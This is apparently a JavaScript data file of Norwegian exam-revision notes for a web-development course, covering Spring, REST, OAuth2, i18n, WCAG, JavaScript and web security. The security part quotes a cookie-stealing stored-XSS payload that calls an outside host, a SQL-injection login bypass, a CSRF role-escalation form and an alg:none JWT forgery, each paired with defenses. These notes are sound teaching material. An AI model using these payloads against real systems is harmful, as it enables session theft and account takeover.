/* Pugg: korte forklaringer med praktiske eksempler. Holder seg til det eksamenene og pensumlista (partb-exam-info) spør om.
   Eksamensspørsmålene med svar hentes automatisk fra DAT.tq (topic = id). */
window.DAT = window.DAT || {};
DAT.groups = [
  { id: "wf", name: "Web Frameworks and Services", weight: 40 },
  { id: "g11n", name: "Globalization", weight: 10 },
  { id: "ud", name: "Universal Design", weight: 5 },
  { id: "sec", name: "Web Security", weight: 25 },
  { id: "js", name: "JavaScript", weight: 20 }
];

DAT.learn = [
/* ============================ WEB FRAMEWORKS ============================ */
{ id: "csr", group: "wf", title: "CSR vs. SSR",
  html: `
<p><b>SSR (server-side rendering):</b> serveren lager ferdig HTML for hver side. Eksempel: e-biblioteket i lab F14 (Spring MVC + Thymeleaf) – du klikker «View Books», serveren henter bøkene, fyller malen og sender en hel HTML-side.</p>
<p><b>CSR (client-side rendering):</b> serveren sender JavaScript, og JavaScript henter data (JSON) fra et REST API og bygger siden i nettleseren. Eksempel: TaskList-obligen din – <code>fetch("./api/tasklist")</code> gir JSON, og komponenten lager tabellradene selv.</p>
<table>
<tr><th>Måles på</th><th>SSR</th><th>CSR</th></tr>
<tr><td>Initial page load</td><td><b>Raskest</b> – ferdig HTML vises med en gang</td><td>Tregere – må laste og kjøre JS, så hente data</td></tr>
<tr><td>Subsequent page load</td><td>Tregere – ny hel side fra server hver gang</td><td><b>Raskest</b> – henter bare JSON, ingen reload</td></tr>
<tr><td>Throughput (server)</td><td>Lavere – serveren må rendre HTML per forespørsel</td><td><b>Høyere</b> – serveren sender bare data</td></tr>
<tr><td>Bandwidth</td><td>Mer – hele siden sendes hver gang</td><td>Mindre over tid – stor første nedlasting, så små JSON-svar</td></tr>
<tr><td>User experience</td><td>Siden lastes på nytt ved hver navigasjon</td><td>Føles som en app etter første last</td></tr>
<tr><td>Development effort</td><td>Enklere – én applikasjon</td><td>Mer – REST API + JS-klient</td></tr>
<tr><td>Compatibility</td><td>Virker i alle nettlesere, også uten JS</td><td>Krever moderne nettleser med JS</td></tr>
</table>
<p class="tip">Huskeregel: SSR vinner <i>første</i> visning og kompatibilitet. CSR vinner alt som skjer <i>etterpå</i> og avlaster serveren.</p>` },

{ id: "mvc", group: "wf", title: "MVC og Spring-lagene",
  html: `
<p><b>MVC</b> deler applikasjonen i tre: <b>Model</b> (data og logikk), <b>View</b> (det som vises) og <b>Controller</b> (tar imot forespørselen, bruker modellen, velger view).</p>
<h3>Lagene i Spring</h3>
<table>
<tr><th>Lag</th><th>Annotasjon</th><th>Gjør</th></tr>
<tr><td>Presentation</td><td><code>@Controller</code> / <code>@RestController</code></td><td>Tar imot HTTP, returnerer view eller JSON</td></tr>
<tr><td>Business</td><td><code>@Service</code></td><td>Forretningslogikk, kaster f.eks. <code>BookNotFoundException</code></td></tr>
<tr><td>Persistence</td><td><code>@Repository</code> / <code>CrudRepository</code></td><td>Lagrer og henter data</td></tr>
<tr><td>Database</td><td></td><td>Selve lagringen</td></tr>
</table>
<p>Hvert lag bruker bare laget under: controller → service → repository → database. De kobles sammen med <code>@Autowired</code>.</p>
<h3>Eksempel fra lab F14 (SSR med Thymeleaf)</h3>
~~~java
@Controller
public class BookController {
    @Autowired
    private BookService bookService;

    @RequestMapping(value="/viewbooks", method=RequestMethod.GET)
    public String findAll(Model model) {
        List<Book> books = (List<Book>) bookService.findAll();
        model.addAttribute("books", books);   // data til viewet
        return "viewbooks";                   // navnet på viewet (viewbooks.html)
    }
}
~~~
<h3>Annotasjonene fra pensumlista</h3>
<ul>
<li><code>@Controller</code> – returnerer view-navn. <code>@RestController</code> – returnerer data (JSON).</li>
<li><code>@RequestMapping</code> – kobler URL (og metode) til klasse/metode. <code>@GetMapping</code>, <code>@PostMapping</code>, <code>@PutMapping</code>, <code>@DeleteMapping</code> er kortformer.</li>
<li><code>@PathVariable</code> – verdi fra stien: <code>/users/{id}</code>. <code>@RequestParam</code> – parameter: <code>/viewbook?id=3</code> eller skjemafelt. <code>@RequestBody</code> – JSON i body blir et objekt.</li>
<li><code>@Autowired</code> – Spring setter inn service/repository for deg.</li>
</ul>
<p class="small">Front Controller og Command (lab F11, eksamen h21): én sentral controller tar imot alle forespørsler, finner riktig kommando i en Map og kjører <code>execute()</code>. I Spring er DispatcherServlet front controlleren.</p>` },

{ id: "rest", group: "wf", title: "REST, RMM og endepunkt-tabellen",
  html: `
<h3>Richardson Maturity Model</h3>
<table>
<tr><th>Nivå</th><th>Kjennetegn</th><th>Eksempel</th></tr>
<tr><td>0</td><td>Én URI, én metode (POST) for alt</td><td><code>POST /api</code></td></tr>
<tr><td>1</td><td>Egen URI per ressurs</td><td><code>POST /students/1</code></td></tr>
<tr><td>2</td><td>Riktige HTTP-verb + statuskoder</td><td><code>GET /students/1</code> → 200</td></tr>
<tr><td>3</td><td>Lenker i responsen (HATEOAS)</td><td><code>"_links": { "self": … }</code></td></tr>
</table>
<h3>Oppskrift for endepunkt-tabellen (kommer hver gang)</h3>
<ol>
<li>Ressursene er substantiv i flertall: <code>/students</code>, <code>/courses</code>.</li>
<li>Én bestemt: legg på id: <code>/students/{sid}</code>.</li>
<li>Noe som tilhører en annen ressurs blir under-ressurs: <code>/students/{sid}/courses/{cid}</code> (maks fire nivåer).</li>
<li>Verbet ligger i HTTP-metoden, aldri i URI-en.</li>
</ol>
<table>
<tr><th>Handling</th><th>HTTP</th><th>URI</th><th>Status i kursets løsninger</th></tr>
<tr><td>Opprette</td><td>POST</td><td>/students</td><td>201 CREATED</td></tr>
<tr><td>Liste alle</td><td>GET</td><td>/students</td><td>200 OK (tom liste: 204 NO_CONTENT)</td></tr>
<tr><td>Se én</td><td>GET</td><td>/students/{sid}</td><td>200 OK (finnes ikke: 404 NOT_FOUND)</td></tr>
<tr><td>Oppdatere</td><td>PUT</td><td>/students/{sid}</td><td>200 OK</td></tr>
<tr><td>Slette</td><td>DELETE</td><td>/students/{sid}</td><td>200 OK</td></tr>
</table>
<h3>HATEOAS i obligen din</h3>
~~~java
o.add(linkTo(methodOn(UserController.class).getUserOrder(id, o.getId())).withSelfRel());
o.add(linkTo(methodOn(UserController.class).getUserOrders(id)).withRel("all-orders"));
~~~
<p>Responsen får da lenker til seg selv og til hva klienten kan gjøre videre.</p>` },

{ id: "controller", group: "wf", title: "Controller- og service-koden (mal)",
  html: `
<p>Den største kodeoppgaven. Sensor trekker lite for syntaks, men vil se riktig mapping, parametre, service-kall og statuskode. Dette er mønsteret fra løsningsforslagene (h24, v24) og obligen din:</p>
~~~java
@RestController
@RequestMapping("/studapp/api/v1")
public class StudentController {

    @Autowired
    private StudentService studentService;

    // LISTE: tom liste -> NO_CONTENT, ellers OK
    @GetMapping("/students")
    @PreAuthorize("hasAuthority('ADMIN')")
    public ResponseEntity<Object> getStudents() {
        List<Student> students = studentService.findAll();
        if (students.isEmpty())
            return new ResponseEntity<>(HttpStatus.NO_CONTENT);
        return new ResponseEntity<>(students, HttpStatus.OK);
    }

    // SE ÉN: id fra stien
    @GetMapping("/students/{sid}")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.sid == #sid")
    public ResponseEntity<Object> getStudent(@PathVariable("sid") Long sid)
            throws StudentNotFoundException {
        Student student = studentService.findById(sid);
        return new ResponseEntity<>(student, HttpStatus.OK);
    }

    // OPPRETTE: JSON i body -> CREATED
    @PostMapping("/students")
    public ResponseEntity<Object> createStudent(@RequestBody Student student) {
        Student nstudent = studentService.saveStudent(student);
        return new ResponseEntity<>(nstudent, HttpStatus.CREATED);
    }

    // OPPDATERE: både body og id
    @PutMapping("/students/{sid}")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.sid == #sid")
    public ResponseEntity<Object> updateStudent(@RequestBody Student student,
            @PathVariable("sid") Long sid) throws StudentNotFoundException {
        Student ustudent = studentService.updateStudent(student, sid);
        return new ResponseEntity<>(ustudent, HttpStatus.OK);
    }

    // SLETTE under-ressurs: to id-er fra stien
    @DeleteMapping("/students/{sid}/courses/{cid}")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.sid == #sid")
    public ResponseEntity<Object> withdrawCourse(@PathVariable("sid") Long sid,
            @PathVariable("cid") Long cid)
            throws StudentNotFoundException, CourseNotFoundException {
        Set<Course> courses = studentService.deleteCourse(sid, cid);
        return new ResponseEntity<>(courses, HttpStatus.OK);
    }
}
~~~
<h3>Service-klassen (når du må skrive den selv, som h23)</h3>
~~~java
@Service
public class StudentService {

    @Autowired
    private StudentRepository studentRepository;

    public Student saveStudent(Student student) {
        return studentRepository.save(student);
    }

    public Student findById(Long sid) throws StudentNotFoundException {
        return studentRepository.findById(sid)
            .orElseThrow(() -> new StudentNotFoundException("Student not found!"));
    }

    public Student updateStudent(Student student, Long sid) throws StudentNotFoundException {
        findById(sid);                    // kaster unntak hvis den ikke finnes
        return studentRepository.save(student);
    }

    public void deleteById(Long sid) throws StudentNotFoundException {
        findById(sid);
        studentRepository.deleteById(sid);
    }
}
~~~
<p class="tip">Sjekkliste per metode: mapping med riktig URI · <code>@PathVariable</code>/<code>@RequestBody</code> · kall service · <code>new ResponseEntity&lt;&gt;(body, HttpStatus.X)</code> · <code>throws …NotFoundException</code>.</p>` },

{ id: "oauth", group: "wf", title: "OAuth2-flytene og @PreAuthorize",
  html: `
<h3>Rollene</h3>
<ul>
<li><b>Resource owner</b> – brukeren.</li>
<li><b>Application / client</b> – appen brukeren bruker.</li>
<li><b>Authorization server / IdP</b> – logger inn brukeren og utsteder token (Keycloak i obligen).</li>
<li><b>Resource server</b> – REST API-et som sjekker tokenet.</li>
</ul>
<h3>Authorization code (lærerens figur, 8 steg)</h3>
<ol>
<li>Access application</li><li>Authentication and request authorization</li><li>Authentication and grant authorization (hos IdP)</li><li>Send authorization code</li><li>Request code exchange for token</li><li>Issue access token</li><li>Request resource with access token</li><li>Return resource</li>
</ol>
<h3>De tre flytene eksamen har spurt om</h3>
<table>
<tr><th>Flyt</th><th>Kort</th></tr>
<tr><td>Authorization code</td><td>Appen får først en <b>kode</b>, og bytter koden mot token direkte med IdP. Tokenet er aldri synlig i nettleseren.</td></tr>
<tr><td>Implicit</td><td>Ingen kode – tokenet kommer <b>rett i redirect-URL-en</b>. Synlig i nettleseren → mindre sikker.</td></tr>
<tr><td>Password (resource owner credentials)</td><td>Brukeren gir brukernavn og passord <b>til appen</b>, som sender dem til IdP og får token. Kun for betrodde apper.</td></tr>
</table>
<p>Password grant brukte du selv i oblig 2:</p>
~~~text
curl -X POST http://localhost:8080/realms/DAT152/protocol/openid-connect/token
     --data 'grant_type=password&client_id=dat152oblig2&username=user1&password=user1'
~~~
<h3>@PreAuthorize</h3>
~~~java
@PreAuthorize("hasAuthority('ADMIN')")                    // bare staff
@PreAuthorize("hasAuthority('USER')")                     // alle innloggede brukere
@PreAuthorize("hasAuthority('ADMIN') or authentication.details.userid == #id")   // staff eller eieren selv
~~~
<p><code>#id</code> er metodeparameteren (path-variabelen). <code>authentication.details.userid</code> er id-en til den innloggede. Slik får «user1 bare tilgang til /users/1, men admin får tilgang til alle» – akkurat kravet i obligen og i h25/v26.</p>` },

{ id: "cicd", group: "wf", title: "CI/CD",
  html: `
<p>Står i pensumlista, men har ikke vært spurt om ennå.</p>
<p><b>CI – Continuous Integration:</b> alle merger kode til felles gren ofte, og hver push bygges og testes automatisk. Finner feil tidlig.</p>
<p><b>CD – Continuous Delivery/Deployment:</b> det som består pipelinen, pakkes og rulles ut automatisk. <i>Delivery</i>: klart for produksjon, men siste steg godkjennes manuelt. <i>Deployment</i>: går automatisk helt til produksjon.</p>
<table>
<tr><th>CI-steg</th><th>CD-aktiviteter</th></tr>
<tr><td>Hente koden (checkout)<br>Bygge/kompilere<br>Kjøre enhetstester<br>Kodeanalyse<br>Lage artefakt (jar / Docker-image)</td><td>Publisere artefaktet<br>Deploye til test/staging<br>Akseptansetester<br>Deploye til produksjon<br>Overvåke</td></tr>
</table>
<p><b>YAML-filen</b> beskriver pipelinen: <i>når</i> den kjører (f.eks. ved push til main), <i>hvor</i> (hvilken maskin/image), og <i>stegene i rekkefølge</i>: hent kode → sett opp Java → <code>mvn test</code>/<code>mvn package</code> → bygg image → deploy.</p>` },

/* ============================ GLOBALIZATION ============================ */
{ id: "g11n", group: "g11n", title: "Globalization og property-filer",
  html: `
<p><b>Globalization</b> = gjøre appen tilgjengelig globalt = <b>internationalization</b> + <b>localization</b>.</p>
<ul>
<li><b>i18n</b> – gjøres én gang, teknisk: all tekst flyttes ut av siden til property-filer, slik at nye språk kan legges til <i>uten å endre koden/designet</i>.</li>
<li><b>l10n</b> – gjøres per språk/region (locale): oversette, og formatere dato/tall/valuta riktig. I praksis: lage <code>messages_no.properties</code>.</li>
</ul>
<h3>Oppskrift for property-fil-oppgaven (kommer hver gang)</h3>
<ol>
<li>Gå gjennom siden og gi <b>hver tekst en nøkkel</b> (tittel, ledetekster, lenker, knapper).</li>
<li>Alt som er <b>data</b> blir parametere <code>{0}</code>, <code>{1}</code>: datoer, tall, prosent, navn.</li>
<li>Lag én fil per språk med <b>de samme nøklene</b>.</li>
</ol>
<p>Fra lærerens demo (<code>Config_en_US.properties</code> / <code>Config_no_NO.properties</code>):</p>
~~~properties
# English
home-pg-title = Books
link = Borrow
today = <b>Today''s date is:</b> {0}

# Norsk
home-pg-title = Bøker
link = Låne
today = <b>Dagens dato er:</b> {0}
~~~
<p class="tip">Sensor h21: «Points must be deducted if parameters are not used.» Skriv aldri «50 and 100» eller en dato rett i teksten.</p>
<h3>I Spring</h3>
<ul>
<li><b>SessionLocaleResolver</b> – valgt språk lagres i sesjonen på serveren. Borte når sesjonen er slutt.</li>
<li><b>CookieLocaleResolver</b> – valgt språk lagres i en cookie i nettleseren. Huskes til neste besøk.</li>
<li><b>Controlleren</b> tar imot språkvalget (<code>?locale=no</code>), lagrer det (sesjon/cookie) og sender brukeren tilbake til siden.</li>
<li>I viewet (Thymeleaf): <code>th:text="#{home-pg-title}"</code> henter teksten fra riktig property-fil.</li>
</ul>` },

/* ============================ UNIVERSAL DESIGN ============================ */
{ id: "ud", group: "ud", title: "Universal Design og WCAG",
  html: `
<p>Ren pugg – 5 % som er lette å sikre.</p>
<p><b>Universal Design:</b> «the design of products and environments to be usable by all people, to the greatest extent possible, without the need for adaptation or specialized design.»</p>
<h3>De 7 prinsippene</h3>
<table>
<tr><th>Prinsipp</th><th>Betyr (web-eksempel)</th></tr>
<tr><td>Equitable use</td><td>Samme løsning for alle – ikke en egen side for noen brukere</td></tr>
<tr><td>Flexibility in use</td><td>Kan brukes på flere måter – mus, tastatur, touch</td></tr>
<tr><td>Simple and intuitive use</td><td>Lett å forstå uansett erfaring og språk</td></tr>
<tr><td>Perceptible information</td><td>Informasjonen når fram – tekst + bilde/lyd, god kontrast</td></tr>
<tr><td>Tolerance for error</td><td>Feil får små konsekvenser – bekreft før sletting, angre</td></tr>
<tr><td>Low physical effort</td><td>Lite anstrengelse – få klikk</td></tr>
<tr><td>Size and space for approach and use</td><td>Stor nok plass – store nok knapper</td></tr>
</table>
<h3>WCAG</h3>
<p>Standard fra W3C for å gjøre webinnhold tilgjengelig for personer med funksjonsnedsettelser. 4 prinsipper → retningslinjer → suksesskriterier på nivå A, AA, AAA.</p>
<table>
<tr><th>Prinsipp</th><th>Definisjon</th><th>Retningslinjer</th></tr>
<tr><td><b>1 Perceivable</b></td><td>Info og UI må presenteres slik at brukerne kan oppfatte det</td><td>Text alternatives · Time-based media · Adaptable · Distinguishable</td></tr>
<tr><td><b>2 Operable</b></td><td>UI og navigasjon må kunne betjenes</td><td>Keyboard accessible · Enough time · Seizures and physical reactions · Navigable · Input modalities</td></tr>
<tr><td><b>3 Understandable</b></td><td>Info og betjening må være forståelig</td><td>Readable · Predictable · Input assistance</td></tr>
<tr><td><b>4 Robust</b></td><td>Innholdet må kunne tolkes av mange brukeragenter, også hjelpemidler</td><td>Compatible</td></tr>
</table>
<p class="tip">Eksamen har gått i rekkefølge Operable, Operable, Perceivable, Operable, Operable, Perceivable. Kan du de to utenat, og vet hva Understandable og Robust er, er du trygg.</p>` },

/* ============================ SECURITY ============================ */
{ id: "ssdlc", group: "sec", title: "SSDLC, SAST og DAST",
  html: `
<p>Sikkerhet skal inn i <b>hver fase</b> av utviklingen, ikke bare testes til slutt.</p>
<table>
<tr><th>Fase</th><th>Slik finner du sikkerhetsfeil</th></tr>
<tr><td>Requirements</td><td>Sikkerhetskrav, misuse cases</td></tr>
<tr><td>Design</td><td>Threat modelling</td></tr>
<tr><td>Implementation</td><td>Code review, statisk analyse (SAST)</td></tr>
<tr><td>Testing</td><td>Penetration testing, dynamisk testing (DAST)</td></tr>
<tr><td>Deployment/release</td><td>Konfigurasjonsgjennomgang, final security review</td></tr>
</table>
<table>
<tr><th></th><th>SAST</th><th>DAST</th></tr>
<tr><td>Ser på</td><td>Kildekoden, <b>uten å kjøre</b> programmet</td><td>Den <b>kjørende</b> applikasjonen, utenfra</td></tr>
<tr><td>Type</td><td>White-box</td><td>Black-box</td></tr>
<tr><td>Når</td><td>Tidlig (implementasjon)</td><td>Senere (testing)</td></tr>
<tr><td>Pluss</td><td>Peker på eksakt kodelinje</td><td>Finner det som faktisk kan utnyttes</td></tr>
<tr><td>Minus</td><td>Mange falske alarmer</td><td>Sier ikke hvor i koden feilen er</td></tr>
</table>
<p class="small">I oblig 4 gjorde du begge deler: manuell testing mot kjørende app (dynamisk) og bekreftet i kildekoden (statisk).</p>` },

{ id: "sqli", group: "sec", title: "SQL injection",
  html: `
<p><b>Hva:</b> input fra brukeren limes rett inn i SQL-strengen, så databasen tolker input som SQL-kode.</p>
<p>Fra oblig 4 – innlogging:</p>
~~~java
String sql = "SELECT * FROM SecOblig.AppUser WHERE username = '" + username + "'"
           + " AND passhash = '" + hashedPassword + "'";
~~~
<p>Brukernavn <code>admin' -- </code> gir <code>… WHERE username = 'admin' -- ' AND passhash = …</code>. Alt etter <code>--</code> er kommentar, så passordsjekken forsvinner.</p>
<p><b>Konsekvenser:</b> logge inn som hvem som helst uten passord, lese hele databasen, endre eller slette data.</p>
<h3>Fella som kommer nesten hver gang</h3>
~~~java
String sqlQuery = "SELECT * FROM ACCDB WHERE USERNAME = " + username + " and PASSWORD = " + password;
PreparedStatement stmt = conn.prepareStatement(sqlQuery);   // hjelper ikke!
~~~
<p>PreparedStatement beskytter bare når input bindes med <code>?</code>. Her er input allerede limt inn <i>før</i> <code>prepareStatement</code>.</p>
<h3>Riktig</h3>
~~~java
String sqlQuery = "SELECT * FROM ACCDB WHERE USERNAME = ? AND PASSWORD = ?";
PreparedStatement stmt = conn.prepareStatement(sqlQuery);
stmt.setString(1, username);
stmt.setString(2, password);
stmt.executeQuery();
~~~
<h3>ORDER BY (h22, h25)</h3>
<p>Et kolonnenavn kan ikke være <code>?</code>. Derfor: sjekk at sorteringsnøkkelen er en av de lovlige kolonnene, og bind resten som parametere.</p>
~~~java
if (sortkey.equals("datetime") || sortkey.equals("searchkey")) {
    sql = "SELECT * FROM SecOblig.History WHERE username = ? ORDER BY " + sortkey + " ASC";
} else {
    // ugyldig input: logg / kast unntak
}
PreparedStatement stmt = conn.prepareStatement(sql);
stmt.setString(1, username);
~~~
<h3>Typer</h3>
<ul><li><b>In-band:</b> error-based og union-based (<code>UNION SELECT</code> – krever samme antall kolonner).</li><li><b>Blind:</b> boolean-based og time-based.</li><li><b>Out-of-band.</b></li></ul>` },

{ id: "xss", group: "sec", title: "XSS",
  html: `
<p><b>Hva:</b> angriperen får sitt JavaScript til å kjøre i offerets nettleser, på den sårbare siden. Skjer når untrusted data skrives ut uten output encoding.</p>
<table>
<tr><th>Type</th><th>Hvordan</th><th>Eksempel</th></tr>
<tr><td><b>Reflected</b></td><td>Payload er i forespørselen og kommer rett tilbake i svaret. Offeret må klikke en lenke.</td><td>Oblig 4: søkeordet skrives ut med <code>\${searchkey}</code></td></tr>
<tr><td><b>Stored</b></td><td>Payload lagres på serveren og kjører hos alle som ser siden.</td><td>Oblig 4: søkehistorikken · eksamen: blogg-kommentaren</td></tr>
<tr><td><b>DOM-based</b></td><td>JavaScript på siden skriver untrusted data inn i DOM.</td><td><code>innerHTML = location.hash</code></td></tr>
</table>
<h3>Eksamensscenarioet</h3>
~~~html
<script>document.write(\`<img src='' onerror='http://justpassingby.com/?'document.cookie/>\`);</script>
~~~
<p>Ligger i en kommentar → <b>stored XSS</b>. Sender <code>document.cookie</code> til angriperen → vil <b>stjele session-cookien</b>.</p>
<h3>Mottiltak</h3>
<ul>
<li><b>Output encoding:</b> <code>&lt;</code> blir <code>&amp;lt;</code> osv., så nettleseren viser teksten i stedet for å kjøre den.</li>
<li><b>Input validation.</b></li>
<li><b>HttpOnly</b> på session-cookien, så JavaScript ikke kan lese den.</li>
</ul>
<p><b>Hvorfor filtrering feiler (h22):</b> <code>data.replaceAll("(&lt;script&gt;)", "")</code> kan omgås med <code>&lt;scr&lt;script&gt;ipt&gt;</code>. Og husk: data fra en <b>cookie</b> er også untrusted.</p>` },

{ id: "csrf", group: "sec", title: "CSRF",
  html: `
<p><b>Hva:</b> angriperen lurer nettleseren til en <i>innlogget</i> bruker til å sende en forespørsel brukeren ikke mente å sende. Nettleseren legger ved session-cookien automatisk, så serveren tror det er brukeren.</p>
<p>Fra oblig 4: en HTML-fil med et skjult skjema som poster til <code>/updaterole</code>. Når en innlogget admin åpner filen, endres rollen.</p>
~~~html
<form action="http://localhost:9092/DAT152WebSearch/updaterole" method="POST">
    <input type="hidden" name="username" value="attacker">
    <input type="hidden" name="role" value="ADMIN">
</form>
<script>document.forms[0].submit();</script>
~~~
<h3>Forutsetninger</h3>
<ol><li>En relevant handling finnes (bytte rolle, overføre penger).</li><li>Sesjonen er basert på cookies som sendes automatisk.</li><li>Ingen uforutsigbare parametere – angriperen kjenner alt som må sendes.</li><li>Offeret er innlogget og lures til angriperens side.</li></ol>
<h3>Mottiltak (lista fra flervalgsoppgaven i h21)</h3>
<ul>
<li><b>Synchronizer token pattern</b> – tilfeldig token i sesjonen + skjult felt i skjemaet; serveren sammenligner.</li>
<li><b>Double submit cookie</b> – samme tilfeldige verdi i cookie og i forespørselen.</li>
<li><b>SameSite</b> – cookien sendes ikke med fra andre nettsteder.</li>
<li><b>Referer header</b> – sjekk hvor forespørselen kom fra.</li>
<li><b>Challenge-response</b> – be om passord/kode før handlingen (bank-eksempelet).</li>
</ul>
<p><b>XSS vs CSRF:</b> XSS kjører angriperens script på siden (utnytter brukerens tillit til siden). CSRF sender en falsk forespørsel med offerets cookie (utnytter sidens tillit til nettleseren).</p>` },

{ id: "session", group: "sec", title: "Sesjoner og cookies",
  html: `
<h3>Beskytte session-cookien</h3>
<ul>
<li><b>HttpOnly</b> – JavaScript kan ikke lese cookien → beskytter mot XSS-tyveri.</li>
<li><b>Secure</b> – sendes bare over kryptert forbindelse (HTTPS) → beskytter mot avlytting (session hijacking).</li>
</ul>
<p class="small">I oblig 4 var <code>http-only=false</code> i web.xml – det var en del av funnet ditt.</p>
<h3>Logout som ikke rydder (h24)</h3>
~~~java
request.getSession().removeAttribute("user");      // sårbart: sesjonen lever videre
~~~
~~~java
request.getSession().invalidate();                  // riktig: hele sesjonen ugyldig
~~~
<h3>Session fixation (h23)</h3>
<p>Etter innlogging brukes <b>samme session-id</b> som før. En angriper som har gitt offeret en kjent id, er dermed også «innlogget».</p>
~~~java
if (authUser != null) {
    request.getSession().invalidate();                 // kast gammel sesjon
    HttpSession session = request.getSession(true);    // ny id
    session.setAttribute("user", authUser);
}
~~~
<p class="tip">Sikker session-id (h21): HttpOnly, sendt over https, og brukt for kun én autentisert sesjon.</p>` },

{ id: "jwt", group: "sec", title: "JWT, SSO og tillit",
  html: `
<p>En JWT er <code>Header.Claims.Signature</code>. Header og claims er bare Base64-kodet – alle kan lese dem. Signaturen (over header + claims) viser at tokenet er ekte og ikke endret.</p>
<h3>To måter å signere</h3>
<ul>
<li><b>HMAC (symmetrisk):</b> <code>Signature = HMAC(secretKey, base64(header), base64(claims))</code></li>
<li><b>Asymmetrisk:</b> <code>Signature = PrivateKey(base64(header), base64(claims))</code> – verifiseres med offentlig nøkkel.</li>
</ul>
<p><b>Svak hemmelighet</b> («bergen», «victory», «sentrum»): kan gjettes med ordliste/brute force. Da kan angriperen lage egne gyldige tokens, f.eks. med admin-rolle.</p>
<h3>alg: none-angrepet (oblig 4)</h3>
<ol><li>Endre header til <code>{"alg": "none"}</code> og rollen til ADMIN.</li><li>Base64-kod på nytt, fjern signaturen, behold punktumet: <code>Header.Payload.</code></li></ol>
<table>
<tr><th>Serveren bruker</th><th>JWT #1: alg none, uten signatur</th><th>JWT #2: RS256, endret payload</th></tr>
<tr><td><code>parse(token)</code></td><td><b>Godtas</b> → admin-koden kjøres (linje 7)</td><td>InvalidTokenException (linje 12)</td></tr>
<tr><td><code>parseClaimsJws(token)</code></td><td>InvalidTokenException (linje 12)</td><td>InvalidTokenException (linje 12)</td></tr>
</table>
<p><code>parse()</code> godtar usignerte tokens. <code>parseClaimsJws()</code> krever gyldig signatur. En endret payload gjør alltid signaturen ugyldig.</p>
<h3>Hvem gjør hva</h3>
<table>
<tr><th>Authorization server / IdP (før utstedelse)</th><th>Resource server / SP (ved mottak)</th></tr>
<tr><td>Legger inn iss, aud, sub, exp, iat + claims<br><b>Signerer tokenet</b></td><td>Sjekker signaturen<br>Sjekker at tokenet ikke er utløpt (exp)<br>Sjekker iss og aud<br>Sjekker at claims gir tilgang</td></tr>
</table>
<p><b>Tillit IdP ↔ SP:</b> IdP signerer med sin private nøkkel, SP verifiserer med IdP sin offentlige nøkkel (sertifikat). Symmetrisk: hemmeligheten må deles sikkert på forhånd.</p>
<p><b>Refresh token (h21):</b> må være knyttet til klienten/access tokenet, ellers kan en angriper bruke sitt eget refresh token for en annen klient.</p>` },

{ id: "password", group: "sec", title: "Passord",
  html: `
<p>Har kommet på alle eksamener siden h21.</p>
<h3>Måter å lagre på</h3>
<table>
<tr><th>Metode</th><th>Problem</th></tr>
<tr><td>Klartekst</td><td>Alt er åpent hvis databasen stjeles</td></tr>
<tr><td>Kryptert (toveis)</td><td>Nøkkelen må lagres; den som har den, kan dekryptere alt</td></tr>
<tr><td>Hash (enveis)</td><td>Like passord gir lik hash; raske hasher knekkes fort</td></tr>
<tr><td>Hash + salt</td><td>Bedre, men fortsatt raskt å gjette</td></tr>
<tr><td><b>Slow hash + salt</b></td><td><b>Best</b> (PBKDF2, bcrypt, scrypt)</td></tr>
</table>
<h3>De fire egenskapene – lær disse ordrett</h3>
<ul>
<li><b>Cryptographically secure hash:</b> passordet kan bare verifiseres, ikke gjenopprettes.</li>
<li><b>Slow hash:</b> hver gjetning tar lang tid → det tar mye lengre tid å knekke.</li>
<li><b>Unique salt:</b> to like passord får ulik hash, og rainbow tables virker ikke.</li>
<li><b>Pepper:</b> hemmelighet som <i>ikke</i> ligger i databasen → stjålet database er ikke nok.</li>
</ul>
<p class="small">I oblig 4 var passordene usaltet MD5 – verken slow, salt eller pepper.</p>
<h3>Angrep</h3>
<ul><li><b>Brute-force:</b> prøver alle kombinasjoner.</li><li><b>Dictionary:</b> prøver ordliste med vanlige/lekkede passord.</li><li><b>Rainbow table:</b> slår opp hashen i en ferdig beregnet tabell.</li></ul>
<h3>Sterke passord ved registrering</h3>
<p>Valider på serveren: minimumslengde, store og små bokstaver, tall og spesialtegn, og avvis vanlige passord. (Oblig 4: appen godtok passordet «1».)</p>
<p class="small">Regnestykket fra h21: 11 tegn av 62 mulige = 62¹¹ ≈ 5,2·10¹⁹. 40 kjerner × 10 milliarder/s = 4·10¹¹/s → ca. 1,3·10⁸ s ≈ 4 år.</p>` },

/* ============================ JAVASCRIPT ============================ */
{ id: "jsasync", group: "js", title: "Asynkron kode, Promise og workers",
  html: `
<p><b>Viktigst:</b> JavaScript på en side kjører på <b>én hovedtråd</b>. Asynkron betyr at koden kjøres <i>senere</i> – ikke i en annen tråd. (Sensor h23: 0 poeng hvis du setter likhet mellom asynkron og tråder.)</p>
<h3>Asynkron kode</h3>
~~~javascript
button.addEventListener("click", () => { console.log("klikk"); });   // kjører når brukeren klikker
setTimeout(() => { console.log("senere"); }, 1000);                   // kjører etter 1 s
fetch("../api/count").then(response => { /* kjører når svaret kommer */ });
~~~
<p><b>Blokkerende kode</b> (f.eks. en lang løkke) stopper alt: ingen klikk behandles, siden oppdateres ikke – fanen fryser.</p>
<h3>Promise</h3>
~~~javascript
function waitforSomething() {
    return new Promise((resolve, reject) => {
        setTimeout(() => { resolve("Done"); }, 1000);    // resolves av asynkron kode
    });
}

async function myFunction() {
    try {
        const answer = await waitforSomething();   // venter på resolve
        console.log(answer);
    } catch (e) {                                  // havner her ved reject
        console.log(e.message);
    }
}
~~~
<p>Det som står etter <code>await</code> må være en <b>Promise</b>. Den vil enten <i>resolve</i> eller <i>reject</i>.</p>
<h3>Web Worker</h3>
<p>Egen bakgrunnstråd for tungt arbeid. Har <b>ikke</b> tilgang til DOM. Snakker med hovedtråden via meldinger.</p>
~~~javascript
// main.js
const worker = new Worker("worker.js");
worker.addEventListener("message", (event) => { console.log(event.data); });
worker.postMessage("start");

// worker.js
self.addEventListener("message", (event) => {
    self.postMessage("Welcome to DAT152");
});
~~~
<p><b>Maks tråder mot DOM = 1.</b> Bare hovedtråden; workers har ikke DOM-tilgang.</p>` },

{ id: "jscomp", group: "js", title: "Web-komponenter (10 %-oppgaven)",
  html: `
<p>Hver eksamen har én komponent-oppgave. Mønsteret er det samme som i TaskList-obligen din og i alle løsningsforslagene:</p>
~~~javascript
const template = document.createElement("template");
template.innerHTML = \`<div id="list"></div>\`;

const rowtemplate = document.createElement("template");
rowtemplate.innerHTML = \`
    <div class="message">
        <div class="author"></div>
